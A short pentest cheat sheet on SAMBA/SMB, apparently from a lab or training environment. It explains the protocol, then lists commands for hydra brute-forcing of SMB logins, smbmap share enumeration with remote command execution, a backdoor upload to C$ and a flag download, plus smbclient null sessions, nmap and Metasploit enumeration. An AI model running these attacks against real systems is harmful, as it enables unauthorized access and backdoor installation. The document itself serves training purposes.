# SAMBA

# Explanation

- SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).

- SAMBA is the Linux implementation of SMB (Server Message Block), and allows Windows systems to access Linux shares and devices.

- SBM uses port 445 (TCP). However, originally, SBM ran on top of NetBIOS using port 139.

- SAMBA utilizes username and password authentication in order to obtain access to the server or a network share.

- We can perform a brute-force attack on the SAMBA server in order to obtain legitimate credentials.

- After obtaining legitimate credentials, we can use a utility called SMBMap in order to enumerate SAMBA share drives, list the contents of the shares as well as download files and execute remote commands on the target.

- We can also utilize a tool called SMBClient. SMBClient is a client that is part of the SAMBA software suite. It communicates with a LAN Manager server, offering an interface similar to that of the ftp program. It can be used to download files from the server to the local machine, upload files from the local machine to the server as well as retrieve directory information from the server.

# SAMBA Brute force attack

```
hydra -L admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <target> smb
```

# SMBmap

```
smbmap -u administrator -p smbserver_771 -H <target>
smbmap -u administrator -p smbserver_771 -d . -H <target>
smbmap -u administrator -p smbserver_771 -L -H <target>
smbmap -u administrator -p smbserver_771 -r 'C$' -H <target>
smbmap -u administrator -p smbserver_771 -x 'ipconfig' -H <target>
smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H <target>
smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H <target>
```

# SMBClient

```
smbclient -L -U admin <target> 
smbclient -L -N <target>
```

# NMAP

```
nmap --script=smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 -p445 <target>
```

# Metasploit Framework

```
msf6 > use auxiliary/scanner/smb/pipe_auditor
```